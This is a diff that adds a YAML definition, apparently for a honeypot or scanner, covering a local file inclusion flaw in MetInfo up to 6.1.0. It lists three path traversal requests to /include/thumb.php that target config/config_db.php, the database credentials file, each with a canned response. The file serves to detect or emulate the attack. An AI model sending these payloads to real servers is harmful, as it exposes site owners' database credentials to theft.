@@ -1,0 +1,45 @@
+id: metinfo-lfi
+info:
+  name: MetInfo <=6.1.0 - Local File Inclusion
+  author: pikpikcu
+  description: MetInfo 6.0.0 through 6.1.0 is vulnerable to local file inclusion and
+    allows remote unauthenticated attackers access to locally stored files and their
+    content.
+  severity: high
+  reference:
+  - https://paper.seebug.org/676/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 3
+  tags: metinfo,lfi
+traps:
+- request:
+    method: GET
+    path: /include/thumb.php?dir=http/.....///.....///config/config_db.php
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: con_db_passcon_db_name
+- request:
+    method: GET
+    path: /include/thumb.php?dir=.....///http/.....///config/config_db.php
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: GET
+    path: /include/thumb.php?dir=http\\..\\..\\config\\config_db.php
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
